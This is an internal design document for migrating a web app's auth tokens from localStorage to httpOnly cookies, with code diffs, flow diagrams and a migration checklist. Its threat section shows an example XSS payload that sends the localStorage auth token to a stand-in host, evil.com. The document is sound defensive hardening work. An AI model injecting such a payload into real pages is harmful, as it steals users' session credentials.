# Authentication Security - localStorage to httpOnly Cookies Migration

**Document Version:** 1.0  
**Date:** November 30, 2024  
**Status:** Implementation Pending

---

## 1. Problem Statement

### Current Implementation (Insecure)

The application currently stores authentication credentials in browser `localStorage`:

```typescript
// services/authService.ts - Lines 89-96
localStorage.setItem('auth_token', response.token);
localStorage.setItem('user_data', JSON.stringify(response.user));
localStorage.setItem('user_role', response.user.role);
localStorage.setItem('client_id', String(response.client_id));
```

### Why localStorage is Insecure

```
┌─────────────────────────────────────────────────────────────────┐
│  ATTACK VECTORS FOR localStorage                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. XSS (Cross-Site Scripting) Attack                           │
│     ─────────────────────────────────────                       │
│     Attacker injects: <script>                                  │
│       fetch('https://evil.com/steal?token=' +                   │
│             localStorage.getItem('auth_token'));                │
│     </script>                                                   │
│     Result: Token stolen, account compromised                   │
│                                                                  │
│  2. Browser DevTools Access                                      │
│     ──────────────────────────                                  │
│     Anyone with physical access:                                │
│     F12 → Application → Local Storage → Copy token              │
│     Result: Credential theft in seconds                         │
│                                                                  │
│  3. Malicious Browser Extensions                                 │
│     ─────────────────────────────                               │
│     Extensions can read localStorage of any domain              │
│     Result: Mass credential harvesting                          │
│                                                                  │
│  4. Shared/Public Computers                                      │
│     ───────────────────────────                                 │
│     localStorage persists after logout if not cleared           │
│     Result: Next user can access previous session               │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. Solution: httpOnly Cookies

### How httpOnly Cookies Protect Data

```
┌─────────────────────────────────────────────────────────────────┐
│  httpOnly Cookie Security Model                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Cookie Flags:                                                   │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │ httpOnly = true                                          │    │
│  │   → JavaScript CANNOT read (document.cookie blocked)     │    │
│  │   → XSS attacks cannot steal the token                   │    │
│  │                                                          │    │
│  │ secure = true                                            │    │
│  │   → Cookie ONLY sent over HTTPS                          │    │
│  │   → Man-in-the-middle cannot intercept                   │    │
│  │                                                          │    │
│  │ samesite = strict                                        │    │
│  │   → Cookie NOT sent with cross-site requests             │    │
│  │   → CSRF attacks blocked                                 │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                  │
│  Automatic Behavior:                                             │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │ Browser automatically sends cookie with every request    │    │
│  │ to the same origin - no JavaScript needed!               │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Security Comparison

| Attack Vector | localStorage | httpOnly Cookie |
|--------------|--------------|-----------------|
| XSS (script injection) | ❌ Token stolen | ✅ Protected |
| DevTools inspection | ❌ Visible | ✅ Not readable |
| Browser extensions | ❌ Accessible | ✅ Protected |
| CSRF attacks | ✅ Not affected | ✅ Protected (samesite) |
| Network interception | ❌ If HTTP | ✅ Protected (secure) |

---

## 3. Current Code Analysis

### Files Storing Auth Data in localStorage

| File | Line | localStorage Key | Data Stored |
|------|------|------------------|-------------|
| `services/authService.ts` | 89 | `auth_token` | JWT access token |
| `services/authService.ts` | 90 | `user_data` | User object (email, name, etc.) |
| `services/authService.ts` | 91 | `user_role` | "studio_owner" or "client" |
| `services/authService.ts` | 93 | `client_id` | Client ID number |
| `lib/api-client.ts` | 68 | `auth_token` | On token refresh |

### Files Reading Auth Data from localStorage

| File | Usage |
|------|-------|
| `lib/api-client.ts` | Authorization header construction |
| `services/contractService.ts` | API requests |
| `services/uploadService.ts` | File upload authentication |
| `services/chunkedUploadService.ts` | Chunked upload auth |
| `services/invoiceService.ts` | Invoice API calls |
| `services/apiNotificationService.ts` | Notification API |
| `services/unifiedCacheManager.ts` | Cache authentication |
| `contexts/AuthContext.tsx` | Auth state management |
| `components/ConsentScreen.tsx` | Consent verification |
| `src/pages/PrivacySettings.tsx` | Privacy API calls |
| `App.tsx` | Initial auth check |
| `components/CreateContractModal.tsx` | Contract creation |

---

## 4. Required Changes

### 4.1 Backend Changes (auth.py)

#### Current Code (Insecure):
```python
# app/routers/auth.py - Lines 54-65
response.set_cookie(
    key="access_token",
    value=access_token,
    httponly=True,
    secure=False,      # ❌ INSECURE - Allows HTTP
    samesite="lax",    # ❌ WEAK - Should be "strict"
    path="/",
    max_age=30 * 60
)
```

#### Target Code (Secure):
```python
# app/routers/auth.py - SECURE VERSION
response.set_cookie(
    key="access_token",
    value=access_token,
    httponly=True,
    secure=True,       # ✅ HTTPS only
    samesite="strict", # ✅ No cross-site requests
    path="/",
    max_age=30 * 60
)
```

#### New Endpoint - Auth Verification:
```python
# Add to app/routers/auth.py
@router.get("/verify")
def verify_auth(current_user: UserRead = Depends(get_current_user)):
    """
    Lightweight endpoint to verify authentication status.
    Returns 200 if authenticated, 401 if not.
    Used by frontend instead of localStorage check.
    """
    return {"authenticated": True, "user_id": current_user.id}
```

### 4.2 Frontend Changes

#### authService.ts - Remove localStorage Storage

**Current (Insecure):**
```typescript
private storeAuthData(response: AuthResponse): void {
    localStorage.setItem('auth_token', response.token);
    localStorage.setItem('user_data', JSON.stringify(response.user));
    localStorage.setItem('user_role', response.user.role);
    if (response.client_id) {
        localStorage.setItem('client_id', String(response.client_id));
    }
}

isAuthenticated(): boolean {
    return !!localStorage.getItem('auth_token');
}
```

**Target (Secure):**
```typescript
private storeAuthData(response: AuthResponse): void {
    // Token stored in httpOnly cookie by backend - no localStorage needed
    // Only store non-sensitive UI state if needed
    console.log('[AuthService] Auth data received, stored in httpOnly cookie');
}

async isAuthenticated(): Promise<boolean> {
    try {
        // Verify authentication via API call
        await apiClient.get('/api/auth/verify');
        return true;
    } catch {
        return false;
    }
}
```

#### api-client.ts - Remove Authorization Header Fallback

**Current (Insecure):**
```typescript
private getAuthHeaders(): HeadersInit {
    const token = localStorage.getItem('auth_token');
    const headers: HeadersInit = {
        'Content-Type': 'application/json',
    };
    if (token) {
        headers['Authorization'] = `Bearer ${token}`;
    }
    return headers;
}
```

**Target (Secure):**
```typescript
private getAuthHeaders(): HeadersInit {
    // Token sent automatically via httpOnly cookie
    // credentials: 'include' ensures cookie is sent
    return {
        'Content-Type': 'application/json',
    };
}

// Ensure all fetch calls include credentials
const response = await fetch(url, {
    method,
    headers: this.getAuthHeaders(),
    credentials: 'include',  // ✅ This sends the httpOnly cookie
    body: data ? JSON.stringify(data) : undefined,
});
```

---

## 5. Authentication Flow Comparison

### Current Flow (Insecure)

```
┌──────────┐                                    ┌──────────┐
│  Client  │                                    │  Server  │
└────┬─────┘                                    └────┬─────┘
     │                                               │
     │  1. POST /api/auth/login                      │
     │  {username, password}                         │
     │──────────────────────────────────────────────>│
     │                                               │
     │  2. Response:                                 │
     │  {token: "eyJ...", user: {...}}              │
     │  Set-Cookie: access_token=xxx (httpOnly)      │
     │<──────────────────────────────────────────────│
     │                                               │
     │  3. JavaScript stores token:                  │
     │  localStorage.setItem('auth_token', token) ❌ │
     │                                               │
     │  4. Subsequent requests:                      │
     │  Authorization: Bearer <token from localStorage>
     │──────────────────────────────────────────────>│
     │                                               │
```

### Target Flow (Secure)

```
┌──────────┐                                    ┌──────────┐
│  Client  │                                    │  Server  │
└────┬─────┘                                    └────┬─────┘
     │                                               │
     │  1. POST /api/auth/login                      │
     │  {username, password}                         │
     │──────────────────────────────────────────────>│
     │                                               │
     │  2. Response:                                 │
     │  {user: {...}}  (NO token in body)            │
     │  Set-Cookie: access_token=xxx                 │
     │    httpOnly=true, secure=true, samesite=strict│
     │<──────────────────────────────────────────────│
     │                                               │
     │  3. JavaScript: Nothing stored! ✅            │
     │  Cookie managed by browser automatically      │
     │                                               │
     │  4. Subsequent requests:                      │
     │  Cookie: access_token=xxx (automatic) ✅      │
     │  (credentials: 'include')                     │
     │──────────────────────────────────────────────>│
     │                                               │
```

---

## 6. Migration Strategy

### Step 1: Backend First
1. Update cookie settings to `secure=true`, `samesite=strict`
2. Add `/api/auth/verify` endpoint
3. Deploy and test

### Step 2: Frontend Gradual Migration
1. Update `api-client.ts` to remove Authorization header
2. Update `authService.ts` to use API verification
3. Update each file that reads from localStorage
4. Remove localStorage writes on login

### Step 3: Cleanup
1. Add logout function to clear any legacy localStorage
2. Update tests
3. Document the new auth flow

---

## 7. Testing Checklist

- [ ] Login sets httpOnly cookie (check DevTools Network tab)
- [ ] localStorage no longer contains `auth_token`
- [ ] API requests work with cookie only (no Authorization header)
- [ ] `/api/auth/verify` returns 200 when authenticated
- [ ] `/api/auth/verify` returns 401 when not authenticated
- [ ] Logout clears the cookie
- [ ] Token refresh works via cookie
- [ ] Cross-origin requests are blocked (samesite=strict)

---

## 8. Rollback Plan

If issues arise:
1. Revert frontend changes (re-enable localStorage)
2. Keep backend dual-mode (accept both cookie and header)
3. Set `secure=false` temporarily if HTTPS not ready

---

## Related Documents

- [01_SECURITY_OVERVIEW.md](./01_SECURITY_OVERVIEW.md) - Security overview
- [04_HTTPS_TLS_CONFIGURATION.md](./04_HTTPS_TLS_CONFIGURATION.md) - Required for `secure=true`
- [05_IMPLEMENTATION_CHECKLIST.md](./05_IMPLEMENTATION_CHECKLIST.md) - Step-by-step guide
